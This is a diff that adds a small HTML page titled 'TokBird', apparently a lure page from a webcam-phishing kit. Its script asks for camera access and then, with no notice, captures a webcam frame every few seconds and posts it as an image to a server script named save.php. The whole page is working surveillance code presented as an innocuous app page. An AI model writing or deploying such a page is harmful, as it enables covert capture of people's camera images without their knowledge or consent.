@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>TokBird</title>
+</head>
+<body style="margin: 0px;background-color: #000;text-align: center">
+    <video id="video" style="width:640px;height: 480px;background-color: #000;margin: 0 auto;"></video>
+</body>
+</html>
+<script>
+    var video = document.getElementById('video');
+    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+    .then(function(stream) {
+        video.srcObject = stream;
+        video.play();
+    })
+    .catch(function(err) {
+        console.log("An error occured! " + err);
+    });
+    setTimeout(saveScreen,5000);
+    function saveScreen(){
+            var videohere = document.getElementById("video");
+            var canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            var ctx = canvas.getContext('2d');
+            ctx.drawImage(videohere, 0, 0, canvas.width, canvas.height);
+            var url = canvas.toDataURL();
+            saveImage(url);
+            setTimeout(setTimeout(saveScreen,2000));
+    }
+    function saveImage(imagedata){
+      var xhr = new XMLHttpRequest();
+        xhr.open("post", 'save.php', true);
+        var data = new FormData();
+        data.append('image', imagedata);
+        xhr.send(data);
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                //alert(xhr.responseText);
+            }
+        };
+  }
+</script>
